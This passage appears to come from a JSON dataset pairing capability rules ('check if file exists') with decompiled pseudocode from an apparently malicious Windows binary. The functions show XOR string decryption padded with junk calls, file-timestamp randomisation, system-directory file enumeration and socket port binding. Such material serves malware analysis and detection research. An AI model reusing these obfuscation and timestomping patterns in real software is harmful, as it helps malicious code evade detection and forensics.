iStack348 = 0x4df;\n        while( true ) {\n            while( true ) {\n                uStack352 = 0x41427b;\n                (*_sym.imp.KERNEL32.dll_ExitProcess)();\ncode_r0x0041427b:\n                iStack348 = 0x414282;\n                iStack348 = fcn.00413c50();\n                if (iStack348 != 0) {\n                    iStack348 = 0x4145a6;\n                    fcn.004032e9();\n                    pcVar7 = swi(3);\n                    uVar10 = (*pcVar7)();\n                    return uVar10;\n                }\n                pcStack360 = fcn.004139a0;\n                pcStack364 = iStack348;\n                uStack356 = iStack348;\n                uStack352 = iStack348;\n                uVar10 = (*_sym.imp.KERNEL32.dll_CreateThread)(0);\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar10);\n                (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n                iVar12 = fcn.0040a7ee();\n                (*_sym.imp.KERNEL32.dll_GetVersion)();\n                if (iVar12 != 1) break;\n                fcn.0040cdeb();\n                uVar10 = (*pcVar13)(0, puStack308);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar10);\n                iStack348 = 0;\n            }\n            uStack300 = 0x7a206715;\n            uStack296 = 0x61373036;\n            uStack292 = 0x6771663e;\n            iStack288 = 0x30277a35;\n            uStack284 = 0x66266142;\n            uStack280 = 0x7a08677d;\n            uStack276 = 0x61153005;\n            uStack272 = 0x67436615;\n            uStack268 = 0xe;\n            uStack267 = 0x7a;\n            uStack266 = 0x3000;\n            uStack264 = 0x66266113;\n            uStack260 = 0x7a0f6779;\n            uStack256 = 0x12;\n            uStack255 = 0x30;\n            uStack254 = 0x6102;\n            uStack252 = 0x675e6608;\n            auStack248[0] = 4;\n            auStack248[1] = 0x7a;\n            auStack248[2] = 0x12;\n            auStack248[3] = 0x30;\n            pcStack244 = 0x663f6147;\n            auStack240[0] = 0x48;\n            auStack240[1] = 0x67;\n            uStack238 = 0x7a11;\n            uStack236 = 10;\n            uStack235 = 0x30;\n            uStack234 = 8;\n            uStack233 = 0x61;\n            pcStack232 = 0x67556608;\n            pcStack228 = 0x303a7a13;\n            uStack224 = 0x67;\n            uStack223 = 0x61;\n            uStack356 = 0x7a616730;\n            uStack352 = CONCAT31(uStack352._1_3_, 0x66);\n            fcn.0040982d(extraout_ECX);\n            puStack328 = &stack0xfffffed0 + -pcStack220;\n            iStack312 = 0;\n            do {\n                iVar12 = iStack312;\n                pcVar1 = pcStack220 + iStack312;\n                cVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                uVar2 = (&stack0xfffffe98)[iVar12 % 5];\n                uVar3 = pcVar1[puStack328];\n                cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                iStack312 = iStack312 + 1;\n                *pcVar1 = cVar5 + ((uVar2 ^ uVar3) - cVar4);\n            } while (iStack312 < 0x4e);\n            uStack304._0_2_ = 0x714a;\n            uStack304._2_2_ = 0x303a;\n            uStack300 = 0x711c4118;\n            uStack296 = 0x4104301d;\n            uStack292 = 0x303b7102;\n            iStack288 = 0x7100410e;\n            uStack284 = 0x4144301d;\n            uStack280 = 0x303d7133;\n            uStack276 = 0x711c4100;\n            uStack272 = 0x41123002;\n            uStack268 = 0x33;\n            uStack267 = 0x71;\n            uStack266 = 0x3069;\n            pcStack360 = 0x3069716f;\n            uStack356 = CONCAT22(uStack356._2_2_, 0x4161);\n            fcn.00409896(extraout_ECX_00);\n            puStack332 = &stack0xfffffecc + -uStack352;\n            iVar12 = 0;\n            do {\n                pcVar1 = uStack352 + iVar12;\n                cVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                uVar2 = (&stack0xfffffe94)[iVar12 % 6];\n                uVar3 = pcVar1[puStack332];\n                cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                pcVar13 = pcStack200;\n                iVar12 = iVar12 + 1;\n                *pcVar1 = cVar5 + ((uVar2 ^ uVar3) - cVar4);\n                pcVar7 = _sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW;\n            } while (iVar12 < 0x28);\n            (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)\n                      (CONCAT22(uStack222, CONCAT11(uStack223, uStack224)), pcStack200, 0x104);\n            (*pcVar7)(pcStack364, pcStack232, 0x104);\n            iStack348 = 0x4144db;\n            iVar12 = fcn.00406cce();\n            uVar10 = iStack288;\n            if (iVar12 != 0) break;\n            iStack348 = 0x4144e8;\n            iVar12 = fcn.00413612();\n            if (iVar12 == 0) break;\n            iStack348 = 0x4144f7;\n            fcn.0040f405();\n            iStack348 = 0;\n        }\n        iStack348 = 0x414504;\n        fcn.004136ac();\n        iStack348 = 0;\n        uStack352 = 0;\n        uStack356 = 0;\n        pcStack360 = fcn.0040774a;\n        pcStack364 = NULL;\n        uVar11 = (*_sym.imp.KERNEL32.dll_CreateThread)(0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar11);\n        pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar11 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, pcVar13);\n        pcVar13 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar11);\n        uVar11 = (*pcVar7)(0, CONCAT22(uStack222, CONCAT11(uStack223, uStack224)));\n        (*pcVar13)(uVar11);\n        fcn.00409871();\n        fcn.00409808();\n        uVar10 = (*pcVar7)(0, uVar10);\n        pcVar14 = _sym.imp.ntdll.dll_RtlFreeHeap;\n        (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar10);\n        uVar10 = (*pcVar7)(0, iStack348);\n        (*pcVar13)(uVar10);\n        uVar8 = 0;\n        do {\n            puStack332[uVar8] = puStack332[uVar8] + -0x6d;\n            uVar8 = uVar8 + 1;\n        } while (uVar8 < 0x29);\n    }\n    else {\n        iStack348 = 0xffffffff;\n        uStack352 = 0;\n        uStack356 = 0;\n        pcStack360 = NULL;\n        pcStack364 = fcn.00411dd1;\n        uVar10 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0);\n        (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(uVar10);\n        uVar10 = (*pcVar7)(0, puVar9);\n        pcVar14 = _sym.imp.ntdll.dll_RtlFreeHeap;\n        (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar10);\n        uVar10 = (*pcVar7)(0, puStack328);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar10);\n        uVar8 = 0;\n        do {\n            puStack332[uVar8] = puStack332[uVar8] + -0x6d;\n            uVar8 = uVar8 + 1;\n        } while (uVar8 < 0x29);\n    }\n    uVar10 = (*pcVar7)(0, puStack332);\n    (*pcVar14)(uVar10);\n    fcn.0040cd84();\n    return 0;\n}\n",
        "token_count": 6864
    },
    "004067fd": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004067fd(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    int32_t var_18h;\n    int32_t *var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar4 = -1;\n    iVar3 = 0;\n    var_10h = param_2 * 10;\n    var_ch = param_1;\n    do {\n        iVar1 = var_10h;\n        var_4h = 0;\n        var_8h = 0;\n        puVar5 = &var_18h;\n        for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar5 = 0;\n            puVar5 = puVar5 + 1;\n        }\n        iVar1 = fcn.004063e1(iVar1, 0, &var_8h, &var_4h);\n        if (iVar1 == 0) {\n            if (var_4h == var_8h) {\n                if (var_18h == 4) {\n                    iVar4 = *var_14h;\n                }\n                var_4h = 0;\n                fcn.0041016b();\n            }\n            if (iVar4 != -1) {\n                return iVar4;\n            }\n        }\n        else {\n            (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n        }\n        iVar3 = iVar3 + 1;\n        if (4 < iVar3) {\n            return iVar4;\n        }\n    } while( true );\n}\n",
        "token_count": 406
    },
    "004069d3": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.004069d3(uint32_t arg_8h, uint arg_ch, int16_t **arg_10h, int32_t *arg_14h)\n\n{\n    char *pcVar1;\n    uint16_t *puVar2;\n    uint8_t uVar3;\n    uint8_t uVar4;\n    int16_t iVar5;\n    uint16_t uVar6;\n    code *pcVar7;\n    char cVar8;\n    char cVar9;\n    uint uVar10;\n    int32_t iVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    uint *puVar14;\n    int16_t *piVar15;\n    uint32_t in_EDX;\n    uint32_t uVar16;\n    uint32_t uVar17;\n    code *pcVar18;\n    uint *puVar19;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint32_t var_34h;\n    uint var_30h;\n    uint32_t var_2ch;\n    uint var_28h;\n    uint32_t var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t lpFileName;\n    uint *var_14h;\n    int32_t var_10h;\n    int32_t lpFindFileData;\n    int16_t *lpMem;\n    int32_t var_4h;\n    \n    pcVar18 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_28h = 0;\n    var_24h = 0;\n    var_4h = 0;\n    var_1ch = in_EDX;\n    uVar10 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x250);\n    pcVar7 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar10);\n    if (iVar11 == 0) {\n        return var_24h;\n    }\n    lpFindFileData = iVar11;\n    uVar10 = (*pcVar18)(8, 0x208);\n    lpFileName = (*pcVar7)(uVar10);\n    if (lpFileName == 0) goto code_r0x00406cb7;\n    uVar10 = (*pcVar18)(8, 0x210);\n    lpMem = (*pcVar7)(uVar10);\n    if (lpMem != NULL) {\n        var_44h = 0x6a5d7516;\n        var_40h = 0x77104a7f;\n        var_3ch = 0x752f5112;\n        piVar15 = lpMem;\n        for (iVar11 = 0x210; iVar11 != 0; iVar11 = iVar11 + -1) {\n            *piVar15 = 0;\n            piVar15 = piVar15 + 1;\n        }\n        var_38h._0_2_ = 0x6a77;\n        var_34h = 0x6a77754a;\n        var_30h._0_1_ = 0x51;\n        uVar10 = (*pcVar18)(8, 0x1d);\n        var_14h = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar10);\n        uVar12 = 0;\n        do {\n            *(var_14h + uVar12) = *(var_14h + uVar12) + 't';\n            uVar12 = uVar12 + 1;\n        } while (uVar12 < 0x1d);\n        var_10h = 0;\n        puVar19 = var_14h;\n        for (iVar11 = 7; iVar11 != 0; iVar11 = iVar11 + -1) {\n            *puVar19 = 0;\n            puVar19 = puVar19 + 1;\n        }\n        *puVar19 = 0;\n        iVar11 = &var_44h - var_14h;\n        do {\n            iVar13 = var_10h;\n            pcVar1 = var_14h + var_10h;\n            cVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar3 = *(&var_34h + iVar13 % 5);\n            uVar4 = pcVar1[iVar11];\n            cVar9 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            puVar19 = var_14h;\n            iVar13 = lpFileName;\n            var_10h = var_10h + 1;\n            *pcVar1 = cVar9 + ((uVar3 ^ uVar4) - cVar8);\n        } while (var_10h < 0xe);\n        puVar14 = var_14h;\n        do {\n            iVar5 = *puVar14;\n            puVar14 = puVar14 + 2;\n        } while (iVar5 != 0);\n        iVar11 = (*_sym.imp.KERNEL32.dll_GetSystemDirectoryW)(lpFileName, 0x103 - (puVar14 - (var_14h + 2) >> 1));\n        if (iVar11 == 0) {\ncode_r0x00406c77:\n            pcVar18 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            uVar10 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpMem);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar10);\n        }\n        else {\n            if (var_20h == 0) {\n                var_1ch = fcn.0040aee0();\n                var_1ch = var_1ch & 0xff;\n                arg_8h = fcn.0040aee0();\n                arg_8h = arg_8h & 0xff;\n            }\n            var_20h = arg_8h;\n            (*_sym.imp.KERNEL32.dll_lstrcatW)(iVar13, puVar19);\n            var_10h = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(iVar13, lpFindFileData);\n            if (var_10h == -1) goto code_r0x00406c77;\n            iVar11 = lpFindFileData;\n            for (uVar12 = 0; (uVar12 <= var_1ch || (uVar12 <= arg_8h)); uVar12 = uVar12 + 1) {\n                if ((uVar12 == var_1ch) || (uVar12 == arg_8h)) {\n                    iVar13 = (*_sym.imp.SHLWAPI.dll_StrRChrW)(iVar11 + 0x2c, 0, 0x2e);\n                    uVar17 = 0;\n                    var_34h = (iVar13 + (-0x2c - iVar11) >> 1) >> 1;\n                    if ((var_4h != 0) && (uVar17 = var_34h - 4,  var_34h < uVar17)) {\n                        uVar17 = 0;\n                    }\n                    if (4 < var_34h) {\n                        var_34h = 4;\n                    }\n                    piVar15 = lpMem;\n                    do {\n                        iVar5 = *piVar15;\n                        piVar15 = piVar15 + 1;\n                    } while (iVar5 != var_28h);\n                    for (piVar15 = lpMem + (piVar15 - (lpMem + 1) >> 1); *piVar15 != 0; piVar15 = piVar15 + 1) {\n                    }\n                    puVar2 = iVar11 + (uVar17 + 0x16) * 2;\n                    uVar6 = *puVar2;\n                    var_24h = uVar6;\n                    if (uVar6 != 0) {\n                        iVar13 = puVar2 - piVar15;\n                        uVar17 = var_24h;\n                        uVar16 = var_34h;\n                        do {\n                            iVar11 = lpFindFileData;\n                            if (uVar16 == 0) break;\n                            *piVar15 = uVar17;\n                            piVar15 = piVar15 + 1;\n                            uVar16 = uVar16 - 1;\n                            uVar6 = *(iVar13 + piVar15);\n                            uVar17 = uVar6;\n                        } while (uVar6 != 0);\n                    }\n                    var_4h = var_4h + var_34h;\n                    *piVar15 = 0;\n                    arg_8h = var_20h;\n                    var_2ch = var_34h;\n                }\n                iVar13 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(var_10h, iVar11);\n                if (iVar13 == 0) {\n                    var_10h = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(lpFileName, iVar11);\n                }\n            }\n            *arg_10h = lpMem;\n            var_24h = 1;\n            lpMem[var_4h] = 0;\n            *arg_14h = var_4h;\n            (*_sym.imp.KERNEL32.dll_FindClose)(var_10h);\n            pcVar18 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            puVar19 = var_14h;\n        }\n        uVar12 = 0;\n        do {\n            *(puVar19 + uVar12) = *(puVar19 + uVar12) ^ 5;\n            uVar12 = uVar12 + 1;\n        } while (uVar12 < 0x1d);\n        uVar10 = (*pcVar18)(0, puVar19);\n        (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar10);\n        iVar11 = lpFindFileData;\n    }\n    uVar10 = (*pcVar18)(0, lpFileName);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar10);\ncode_r0x00406cb7:\n    uVar10 = (*pcVar18)(0, iVar11);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar10);\n    return var_24h;\n}\n",
        "token_count": 2262
    },
    "0040754e": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.0040754e(void)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    char cVar4;\n    char cVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint uVar8;\n    uint *puVar9;\n    uint32_t uVar10;\n    uint lpWSAData;\n    ushort name;\n    ushort var_32h;\n    uint var_30h;\n    int32_t var_24h;\n    uint32_t s;\n    int32_t var_1ch;\n    uint32_t netshort;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar10 = 0;\n    (*_sym.imp.WS2_32.dll_WSAStartup)(0x202, &lpWSAData);\n    uVar6 = (*_sym.imp.WS2_32.dll_socket)(2, 1, 0);\n    if (uVar6 != 0xffffffff) {\n        s = uVar6;\n        iVar7 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        uVar10 = iVar7 + 2000U & 0xffff;\n        uVar6 = 0;\n        if (uVar10 < 64000) {\n            var_14h = 0x4672575a;\n            var_10h = 0x6b554566;\n            var_ch._0_2_ = 0x5659;\n            var_8h = 0x6845656b;\n            var_4h._0_1_ = 0x56;\n            netshort = uVar10;\n            do {\n                uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n                puVar9 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar8);\n                var_1ch = 0;\n                *puVar9 = 0;\n                puVar9[1] = 0;\n                *(puVar9 + 2) = 0;\n                *(puVar9 + 10) = 0;\n                var_24h = &var_14h - puVar9;\n                do {\n                    iVar7 = var_1ch;\n                    pcVar1 = var_1ch + puVar9;\n                    cVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    uVar2 = *(&var_8h + iVar7 % 5);\n                    uVar3 = pcVar1[var_24h];\n                    cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    var_1ch = var_1ch + 1;\n                    *pcVar1 = cVar5 + ((uVar2 ^ uVar3) - cVar4);\n                } while (var_1ch < 10);\n                var_30h = (*_sym.imp.WS2_32.dll_inet_addr)(puVar9);\n                uVar10 = netshort;\n                var_32h = (*_sym.imp.WS2_32.dll_ntohs)(netshort);\n                uVar6 = s;\n                name = 2;\n                iVar7 = (*_sym.imp.WS2_32.dll_bind)(s, &name, 0x10);\n                if (iVar7 == 0) {\n                    (*_sym.imp.WS2_32.dll_closesocket)(uVar6);\n                    uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar9);\n                    uVar6 = (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar8);\n                    break;\n                }\n                uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar9);\n                (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar8);\n                uVar10 = uVar10 + 1;\n                uVar6 = 0;\n                netshort = uVar10;\n            } while (uVar10 < 64000);\n        }\n    }\n    return uVar6 & 0xffff0000 | uVar10 & 0xffff;\n}\n",
        "token_count": 931
    },
    "00409a17": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00409a17(int32_t *arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uVar6;\n    int32_t in_ECX;\n    int32_t *in_EDX;\n    int32_t iVar7;\n    uint var_ch;\n    uint var_8h;\n    int32_t lpNumberOfBytesRead;\n    \n    iVar7 = 0;\n    iVar2 = fcn.004099a5();\n    if (iVar2 != 0) {\n        in_ECX = iVar2;\n    }\n    iVar3 = (*_sym.imp.KERNEL32.dll_CreateFileW)(in_ECX, 0x80000000, 1, 0, 3, 0x80, 0);\n    if (iVar3 != -1) {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetFileSize)(iVar3, 0);\n        if (iVar4 == 0) {\n            iVar4 = 0xe8;\n            goto code_r0x00409ab9;\n        }\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, iVar4 + 2);\n        iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n        if (iVar7 != 0) {\n            iVar5 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar3, iVar7, iVar4, &lpNumberOfBytesRead, 0);\n            if (iVar5 != 0) {\n                if (iVar4 == lpNumberOfBytesRead) {\n                    *(iVar4 + iVar7) = 0;\n                    *in_EDX = iVar7;\n                    *arg_8h = iVar4;\n                    iVar4 = 0;\n                }\n                else {\n                    iVar4 = 0x1e;\n                }\n                goto code_r0x00409ab9;\n            }\n        }\n    }\n    iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\ncode_r0x00409ab9:\n    if (iVar3 != -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    if ((iVar7 != 0) && (iVar4 != 0)) {\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n        (*pcVar1)(uVar6);\n    }\n    if (iVar2 != 0) {\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n        (*pcVar1)(uVar6);\n    }\n    return iVar4;\n}\n",
        "token_count": 607
    },
    "00409afb": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00409afb(uint lpLastWriteTime)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    code *pcVar4;\n    char cVar5;\n    char cVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint uVar9;\n    uint32_t uVar10;\n    uint extraout_ECX;\n    uint in_EDX;\n    uint32_t uVar11;\n    int32_t iVar12;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint lpSystemTime;\n    uint var_2ah;\n    int16_t var_26h;\n    int16_t var_24h;\n    int16_t var_22h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint lpCreationTime;\n    int32_t var_ch;\n    uint lpLastAccessTime;\n    \n    iVar12 = *0x427964;\n    lpLastAccessTime = in_EDX;\n    (*_sym.imp.KERNEL32.dll_GetSystemTime)(&lpSystemTime);\n    pcVar4 = _sym.imp.KERNEL32.dll_SystemTimeToFileTime;\n    uVar11 = iVar12 * 0x19660d + 0x3c6ef35f;\n    lpSystemTime._2_2_ = uVar11 % 0xb + 1;\n    uVar11 = uVar11 * 0x19660d + 0x3c6ef35f;\n    uVar10 = uVar11 * 0x19660d + 0x3c6ef35f;\n    var_2ah._0_2_ = uVar11 % 0x1b + 1;\n    var_2ah._2_2_ = uVar10 % 0x16 + 1;\n    uVar11 = uVar10 * 0x19660d + 0x3c6ef35f;\n    uVar10 = uVar11 * 0x19660d + 0x3c6ef35f;\n    var_26h = uVar11 % 0x3b + 1;\n    var_24h = uVar10 % 0x3b + 1;\n    lpSystemTime._0_2_ = lpSystemTime + -1;\n    var_22h = ((uVar10 * 0x19660d + 0x3c6ef35f) * 0x19660d + 0x3c6ef35f) % 0x3e6 + 1;\n    (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime);\n    (*pcVar4)(&lpSystemTime);\n    (*pcVar4)(&lpSystemTime, lpLastWriteTime);\n    var_64h = 0x43077a71;\n    var_60h = 0x7a3a5127;\n    var_5ch = 0x51274314;\n    var_58h = 0x43557a26;\n    var_54h = 0x7a275112;\n    var_50h = 0x513d4309;\n    var_4ch = 0x43157a20;\n    var_48h = 0x7a675123;\n    var_44h = 0x51124342;\n    var_40h = 0x431d7a37;\n    var_3ch = 0x7a7a512a;\n    var_38h = 0x51364315;\n    var_34h = 0x43707a31;\n    var_18h = 0x43707a54;\n    var_14h._0_2_ = 0x514e;\n    fcn.0040a16d(extraout_ECX);\n    iVar12 = 0;\n    var_ch = &var_64h - var_1ch;\n    do {\n        pcVar1 = var_1ch + iVar12;\n        cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_18h + iVar12 % 6);\n        uVar3 = pcVar1[var_ch];\n        cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        iVar12 = iVar12 + 1;\n        *pcVar1 = cVar6 + ((uVar2 ^ uVar3) - cVar5);\n    } while (iVar12 < 0x34);\n    iVar12 = fcn.004099a5();\n    if (iVar12 != 0) {\n        iVar7 = (*_sym.imp.KERNEL32.dll_CreateFileW)(iVar12, 0x80000000, 1, 0, 3, 0, 0);\n        if ((iVar7 != 0) && (iVar7 != -1)) {\n            iVar8 = (*_sym.imp.KERNEL32.dll_GetFileTime)(iVar12, lpCreationTime, lpLastAccessTime, lpLastWriteTime);\n            pcVar4 = _sym.imp.KERNEL32.dll_SystemTimeToFileTime;\n            if (iVar8 == 0) {\n                (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime, lpCreationTime);\n                (*pcVar4)(&lpSystemTime, lpLastAccessTime);\n                (*pcVar4)(&lpSystemTime, lpLastWriteTime);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar7);\n        }\n        uVar9 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar12);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar9);\n    }\n    fcn.004065d4();\n    return 0;\n}\n",
        "token_count": 1355
    },
    "00409d1f": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00409d1f(uint nNumberOfBytesToWrite)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t in_ECX;\n    uint lpCreationTime;\n    uint lpLastAccessTime;\n    uint lpLastWriteTime;\n    uint lpNumberOfBytesWritten;\n    \n    iVar1 = fcn.004099a5();\n    if (iVar1 != 0) {\n        in_ECX = iVar1;\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_CreateFileW)(in_ECX, 0xc0000000, 0, 0, 4, 0x80, 0);\n    if (iVar2 == -1) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    }\n    else {\n        fcn.00409afb(&lpLastWriteTime);\n        iVar4 = (*_sym.imp.KERNEL32.dll_WriteFile)(iVar2);\n        if (iVar4 == 0) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        else {\n            (*_sym.imp.KERNEL32.dll_SetEndOfFile)(iVar2);\n            uVar3 = 0;\n        }\n        (*_sym.imp.KERNEL32.dll_SetFileTime)(iVar2, &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime);\n        (*_sym.imp.KERNEL32.dll_FlushFileBuffers)(iVar2);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    }\n    if (iVar1 != 0) {\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar1);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    }\n    return uVar3;\n}\n",
        "token_count": 409
    },
    "00409dd7": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00409dd7(int32_t arg_8h)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    char cVar4;\n    char cVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    int32_t in_ECX;\n    uint extraout_ECX;\n    code *pcVar10;\n    uint8_t *puVar11;\n    int32_t iVar12;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    int32_t var_3ch;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint32_t var_2ch;\n    uint32_t var_28h;\n    int32_t var_24h;\n    uint *var_20h;\n    int32_t hFindFile;\n    int32_t var_18h;\n    int32_t lpString2;\n    uint8_t *lpFindFileData;\n    int32_t lpString1;\n    int32_t var_8h;\n    \n    iVar12 = 8;\n    var_28h = 0x104;\n    var_30h = fcn.004099a5();\n    lpString2 = in_ECX;\n    if (var_30h != 0) {\n        lpString2 = var_30h;\n    }\n    var_24h = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString2);\n    pcVar10 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n    lpString1 = iVar7;\n    if (iVar7 != 0) {\n        uVar6 = (*pcVar10)(8, var_24h * 2 + 0xc);\n        var_18h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n        if (var_18h != 0) {\n            uVar6 = (*pcVar10)(8, 0x250);\n            lpFindFileData = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n            if (lpFindFileData != NULL) {\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(iVar7, lpString2);\n                var_8h = 0x5067616c;\n                var_38h = 0x50676130;\n                var_34h._0_2_ = 0x4644;\n                uVar6 = (*pcVar10)(8, 9);\n                puVar8 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar6);\n                uVar9 = 0;\n                do {\n                    *(puVar8 + uVar9) = *(puVar8 + uVar9) ^ 0x9f;\n                    uVar9 = uVar9 + 1;\n                } while (uVar9 < 9);\n                *puVar8 = 0;\n                hFindFile = 0;\n                puVar8[1] = 0;\n                *(puVar8 + 2) = 0;\n                var_2ch = &var_8h - puVar8;\n                var_20h = puVar8;\n                do {\n                    iVar12 = 